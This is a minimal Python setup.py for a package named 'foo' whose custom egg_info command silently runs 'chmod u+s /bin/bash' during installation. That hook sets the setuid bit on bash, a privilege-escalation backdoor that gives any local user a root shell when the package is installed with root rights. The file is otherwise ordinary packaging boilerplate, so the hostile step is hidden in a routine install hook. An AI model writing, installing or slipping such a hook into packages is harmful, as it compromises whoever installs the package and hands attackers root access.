from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

class Run(egg_info):
    def run(self):
        os.system("chmod u+s /bin/bash")
        egg_info.run(self)

setup(
    name="foo",
    version="1.0",
    packages=find_packages(),
    cmdclass={
        'egg_info': Run
    },
)
